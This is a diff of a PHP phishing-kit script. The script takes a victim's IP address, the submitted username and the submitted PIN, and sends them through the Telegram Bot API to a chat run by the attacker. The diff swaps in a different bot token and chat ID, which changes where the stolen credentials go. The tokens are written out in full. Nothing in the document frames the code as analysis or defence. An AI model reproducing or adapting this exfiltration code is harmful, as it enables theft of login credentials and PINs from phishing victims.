@@ -6,13 +6,13 @@ $message .= " + IP   : $ip \n";
 $message .= " + login : ".$_POST['username']."\n";
 $message .= " + PIN : ".$_POST['PIN']."\n";
 $message .= "-------------- IP Infos ------------\n";
-$token = "5710418707:AAGPgcPg_hfb4IWxiNeBB6QdyCREjLVsB_s";
+$token = "1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss";
 $data = [
     'text' => $message,
-    'chat_id' => '-895900324'
+    'chat_id' => '-462207069'
 ];
 
-file_get_contents("https://api.telegram.org/bot5520173907:AAHRZFgI3UY5UqHfjnNtNOSask2HmQwJ9D8/sendMessage?" . http_build_query($data) );
+file_get_contents("https://api.telegram.org/bot1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss/sendMessage?" . http_build_query($data) );
 
 
 
